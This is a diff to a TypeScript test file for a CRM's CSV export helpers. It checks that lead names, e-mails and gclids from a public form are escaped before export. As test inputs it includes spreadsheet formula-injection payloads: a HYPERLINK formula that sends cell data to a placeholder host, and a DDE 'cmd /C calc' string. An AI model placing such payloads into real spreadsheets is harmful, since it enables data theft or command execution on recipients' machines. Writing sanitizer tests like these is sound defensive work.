@@ -1,12 +1,16 @@
 import { describe, expect, it } from "vitest";
 import {
   calcularNps,
+  celulaCsv,
   classeNota,
   comRodape,
   contatoBloqueado,
   contatosParaImovel,
   csvConversoesGoogle,
   csvConversoesMeta,
+  csvFilaEmail,
+  JANELA_DESFAZER_ENVIO_MIN,
+  podeVoltarParaFila,
   dataHoraLocalParaISO,
   deduplicar,
   descricaoImovel,
@@ -272,6 +276,42 @@ describe("origem das conversões", () => {
     expect(telefoneE164("+55 13 99999-1111")).toBe("5513999991111");
     const meta = csvConversoesMeta([{ email: " ANA@X.com ", telefone: "13999991111", nome: "Ana Maria Lima", cidade: "São Paulo", evento: "Purchase", data: "2026-11-03T15:00:00Z", valor: 2500 }]);
     expect(meta.split("\n")[1]).toBe(`ana@x.com,5513999991111,ana,lima,saopaulo,br,Purchase,${Date.parse("2026-11-03T15:00:00Z") / 1000},2500.00,BRL`);
+  });
+
+  it("CSVs neutralizam fórmula do Excel (nome, e-mail e gclid vêm de formulário público)", () => {
+    expect(celulaCsv('=HYPERLINK("https://x/?d="&B2;"Clique")')).toBe(`"'=HYPERLINK(""https://x/?d=""&B2;""Clique"")"`);
+    expect(celulaCsv("+5511")).toBe("'+5511");
+    expect(celulaCsv("-2")).toBe("'-2");
+    expect(celulaCsv("@SUM(A1)")).toBe("'@SUM(A1)");
+    expect(celulaCsv(-2)).toBe("-2"); // número de verdade não muda
+    expect(celulaCsv("Ana")).toBe("Ana");
+    expect(celulaCsv(null)).toBe("");
+    const g = csvConversoesGoogle([{ gclid: "=cmd|' /C calc'!A0", data: "2026-11-03T15:00:00Z", valor: 10 }], "Lead");
+    expect(g.split("\n")[2].startsWith("'=cmd")).toBe(true);
+    const m = csvConversoesMeta([{ email: "=1+1@x.com", telefone: null, nome: "Ana", evento: "Lead", data: "2026-11-03T15:00:00Z", valor: null }]);
+    expect(m.split("\n")[1].startsWith("'=1+1@x.com,")).toBe(true);
+  });
+
+  it("CSV de e-mail da fila: só envio de e-mail pendente que o banco liberou, sem fórmula", () => {
+    const linhas = [
+      { id: "e1", canal: "email", status: "pendente", email: "ana@x.com", nome: "Ana Lima", assunto: "Oferta", mensagem: "Oi, Ana" },
+      { id: "w1", canal: "whatsapp", status: "pendente", email: "bia@x.com", nome: "Bia", assunto: null, mensagem: "Oi" }, // WhatsApp: fora
+      { id: "e2", canal: "email", status: "pendente", email: "caio@x.com", nome: "Caio", assunto: "Oferta", mensagem: "Oi" }, // descadastrou depois: fora
+      { id: "e3", canal: "email", status: "enviado", email: "duda@x.com", nome: "Duda", assunto: "Oferta", mensagem: "Oi" }, // já foi
+      { id: "e4", canal: "email", status: "pendente", email: "eva@x.com", nome: "=HYPERLINK(1)", assunto: "Oferta", mensagem: "Oi" },
+    ];
+    const csv = csvFilaEmail(linhas, new Set(["e1", "w1", "e3", "e4"]));
+    expect(csv.split("\r\n")).toEqual(["email,nome,primeiro_nome,assunto,mensagem", "ana@x.com,Ana Lima,Ana,Oferta,\"Oi, Ana\"", "eva@x.com,'=HYPERLINK(1),'=HYPERLINK(1),Oferta,Oi", ""]);
+  });
+
+  it("voltar para a fila: cancelado e descadastrado sim; enviado só nos primeiros minutos", () => {
+    expect(podeVoltarParaFila("cancelado", null, AGORA)).toBe(true);
+    expect(podeVoltarParaFila("bloqueado", null, AGORA)).toBe(true);
+    expect(podeVoltarParaFila("enviado", new Date(AGORA - 2 * 60_000).toISOString(), AGORA)).toBe(true);
+    expect(podeVoltarParaFila("enviado", new Date(AGORA - (JANELA_DESFAZER_ENVIO_MIN + 1) * 60_000).toISOString(), AGORA)).toBe(false);
+    expect(podeVoltarParaFila("enviado", null, AGORA)).toBe(false);
+    expect(podeVoltarParaFila("pendente", null, AGORA)).toBe(false);
+    expect(podeVoltarParaFila("falhou", null, AGORA)).toBe(false);
   });
 });
 
